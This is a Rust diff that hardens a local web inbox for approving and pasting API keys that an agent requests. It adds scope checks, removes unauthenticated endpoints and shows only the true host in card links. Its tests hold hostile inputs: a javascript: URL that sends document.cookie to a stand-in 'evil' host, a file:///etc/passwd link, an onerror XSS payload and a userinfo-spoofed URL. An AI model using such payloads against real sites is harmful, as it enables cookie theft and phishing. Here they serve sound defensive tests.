@@ -40,7 +40,15 @@ pub fn serve(a: InboxArgs) -> Result<i32> {
     let tokens = inbox_auth::Tokens::ensure()?;
     let server = match Server::http(format!("127.0.0.1:{port}")) {
         Ok(s) => s,
-        Err(_) => { eprintln!("inbox already running on {port}"); return Ok(0); }
+        Err(e) => {
+            // Two `ensure_inbox` racing is normal and quiet; anything else is not.
+            if e.downcast_ref::<std::io::Error>().map(|io| io.kind() == std::io::ErrorKind::AddrInUse).unwrap_or(false) {
+                eprintln!("inbox already running on {port}");
+                return Ok(0);
+            }
+            eprintln!("tokenstash: cannot listen on 127.0.0.1:{port}: {e}");
+            return Ok(tokenstash_core::exit::ERROR);
+        }
     };
     eprintln!("tokenstash inbox → http://127.0.0.1:{port}/");
     let mut last_activity = Instant::now();
@@ -153,13 +161,6 @@ fn handle(app: &App, mut req: Request, tokens: &inbox_auth::Tokens) -> Result<()
 
     app.db.expire_overdue()?;
 
-    if path == "/health" {
-        return respond(req, 200, "text/plain", "ok".into());
-    }
-    if path == "/api/tasks" {
-        let list = app.db.list_tasks(None, true)?;
-        return respond(req, 200, "application/json", serde_json::to_string(&list)?);
-    }
     if path == "/" {
         let list = app.db.list_tasks(None, true)?;
         let flash = q.get("m").cloned();
@@ -167,17 +168,33 @@ fn handle(app: &App, mut req: Request, tokens: &inbox_auth::Tokens) -> Result<()
     }
     if let Some(id) = path.strip_prefix("/t/") {
         let id = id.trim_end_matches('/').to_string();
-        let Some(task) = app.db.find_task(&id)? else { return respond(req, 404, "text/plain", "no such task".into()) };
+        // An ambiguous prefix is an error from the lookup; to the browser it is a 404, not a
+        // dropped connection.
+        let Ok(Some(task)) = app.db.find_task(&id) else { return respond(req, 404, "text/plain", "no such task".into()) };
         if method == "GET" {
-            return respond(req, 200, "text/html; charset=utf-8", page_task(&task, None, session_token, scope));
+            return respond(req, 200, "text/html; charset=utf-8", page_task(&task, None, session_token, scope, &app.cfg.env_file));
         }
         if method == "POST" {
             let action = form.get("action").cloned().unwrap_or_default();
             let ctx = app.ctx();
             let msg: Result<String> = (|| {
                 match (task.kind.clone(), action.as_str()) {
-                    (_, "deny") => { tasks::deny(&ctx, &task, form.get("note").map(|s| s.as_str()))?; Ok(format!("Denied {}", task.title)) }
+                    (kind, "deny") => {
+                        // The paste session is not tied to a directory, so from it "deny" on an
+                        // approval card could close another project's pairing for a day.
+                        if kind == TaskKind::Approval && scope != Scope::Full {
+                            anyhow::bail!("closing an approval card needs the full inbox session: click the desktop notification or run `tokenstash open`, then reload this page");
+                        }
+                        tasks::deny(&ctx, &task, form.get("note").map(|s| s.as_str()))?;
+                        Ok(format!("Denied {}", task.title))
+                    }
                     (TaskKind::Secret, _) => {
+                        // A paste other directories will receive (a Replace card; a key they
+                        // hold a grant for) is a decision about them — the agent's link may not
+                        // make it.
+                        if scope != Scope::Full && tasks::fans_out(&ctx, &task)? {
+                            anyhow::bail!("other directories hold this key, so the paste would reach them too: open this card from the desktop notification or run `tokenstash open`");
+                        }
                         let v = form.get("value").cloned().unwrap_or_default();
                         let v = v.trim().to_string();
                         if v.is_empty() { anyhow::bail!("empty value"); }
@@ -217,7 +234,7 @@ fn handle(app: &App, mut req: Request, tokens: &inbox_auth::Tokens) -> Result<()
             })();
             return match msg {
                 Ok(m) => redirect(req, &format!("/?m={}", urlencoding::encode(&m))),
-                Err(e) => respond(req, 200, "text/html; charset=utf-8", page_task(&task, Some(&format!("{e:#}")), session_token, scope)),
+                Err(e) => respond(req, 200, "text/html; charset=utf-8", page_task(&task, Some(&format!("{e:#}")), session_token, scope, &app.cfg.env_file)),
             };
         }
     }
@@ -350,7 +367,7 @@ fn csrf_field(token: &str) -> String {
     format!("<input type=hidden name=t value=\"{}\">", esc(token))
 }
 
-fn page_task(t: &Task, err: Option<&str>, token: &str, scope: inbox_auth::Scope) -> String {
+fn page_task(t: &Task, err: Option<&str>, token: &str, scope: inbox_auth::Scope, env_file: &str) -> String {
     let csrf = csrf_field(token);
     let mut b = String::new();
     b.push_str("<p><a href='/'>← all tasks</a></p>");
@@ -363,7 +380,10 @@ fn page_task(t: &Task, err: Option<&str>, token: &str, scope: inbox_auth::Scope)
     // card's text becomes something the human clicks, so it does not inherit trust from the
     // layer that stored it. A link that is not http(s) is simply not rendered as a link.
     if let Some(u) = t.url.as_deref().filter(|u| { let l = u.to_ascii_lowercase(); l.starts_with("https://") || l.starts_with("http://") }) {
+        // The label is the host alone: `https://openai.com@evil.example/` must read as
+        // evil.example, not as openai.com.
         let host = u.split_once("//").map(|(_, r)| r).unwrap_or(u).split('/').next().unwrap_or(u);
+        let host = host.rsplit('@').next().unwrap_or(host);
         b.push_str(&format!("<div class=row><a class='btn p' href='{0}' target=_blank rel='noopener noreferrer'>Open {1} ↗</a></div>", esc(u), esc(host)));
     }
     if !t.steps.is_empty() {
@@ -387,7 +407,7 @@ fn page_task(t: &Task, err: Option<&str>, token: &str, scope: inbox_auth::Scope)
             // Rule 12: the card shows the canonical path, what kind of decision this is,
             // the exact destination file, and every key with its identity and sensitivity.
             let kind = match t.expects.as_str() { tasks::APPROVAL_PAIRING => "new directory — first stored keys", tasks::APPROVAL_SENSITIVE => "sensitive / unregistered keys — each its own decision", tasks::APPROVAL_ONCE => "chosen by a running program — this run only", _ => "approval" };
-            b.push_str(&format!("<p class=mut>Directory: <code>{}</code><br>Decision: {}<br>Written to: <code>{}</code></p>", esc(&t.project), esc(kind), esc(&std::path::Path::new(&t.project).join(tokenstash_core::Config::load().map(|c| c.env_file).unwrap_or_else(|_| ".env.local".into())).display().to_string())));
+            b.push_str(&format!("<p class=mut>Directory: <code>{}</code><br>Decision: {}<br>Written to: <code>{}</code></p>", esc(&t.project), esc(kind), esc(&std::path::Path::new(&t.project).join(env_file).display().to_string())));
             let rows: Vec<String> = t.names.iter().filter(|n| n.as_str() != "*").map(|entry| {
                 let (n, identity) = tasks::split_identity(entry);
                 let sensitive = tokenstash_core::registry::lookup(n).map(|p| p.sensitive).unwrap_or(false) || tokenstash_core::registry::lookup(n).is_none();
@@ -444,13 +464,13 @@ mod tests {
     #[test]
     fn a_card_link_is_rendered_only_for_http_schemes() {
         for bad in ["javascript:fetch('//evil/'+document.cookie)", "data:text/html,<script>x</script>", "file:///etc/passwd", "JavaScript:alert(1)"] {
-            let page = page_task(&card(Some(bad), "why"), None, "tok", inbox_auth::Scope::Full);
+            let page = page_task(&card(Some(bad), "why"), None, "tok", inbox_auth::Scope::Full, ".env.local");
             assert!(!page.contains("href='javascript"), "{bad}: {page}");
             assert!(!page.to_lowercase().contains("javascript:"), "{bad}");
             assert!(!page.contains("data:text/html"), "{bad}");
             assert!(!page.contains("Open "), "no link button at all for {bad}");
         }
-        let page = page_task(&card(Some("https://platform.openai.com/api-keys"), "why"), None, "tok", inbox_auth::Scope::Full);
+        let page = page_task(&card(Some("https://platform.openai.com/api-keys"), "why"), None, "tok", inbox_auth::Scope::Full, ".env.local");
         assert!(page.contains("href='https://platform.openai.com/api-keys'"), "{page}");
         assert!(page.contains("Open platform.openai.com"), "the host is what the human reads: {page}");
     }
@@ -458,7 +478,7 @@ mod tests {
     /// Agent-written text is escaped wherever it lands on the page.
     #[test]
     fn agent_written_card_text_cannot_become_markup() {
-        let page = page_task(&card(None, "<img src=x onerror=alert(1)>\"'"), None, "tok", inbox_auth::Scope::Full);
+        let page = page_task(&card(None, "<img src=x onerror=alert(1)>\"'"), None, "tok", inbox_auth::Scope::Full, ".env.local");
         assert!(!page.contains("<img src=x"), "{page}");
         assert!(page.contains("&lt;img src=x onerror=alert(1)&gt;"), "{page}");
     }
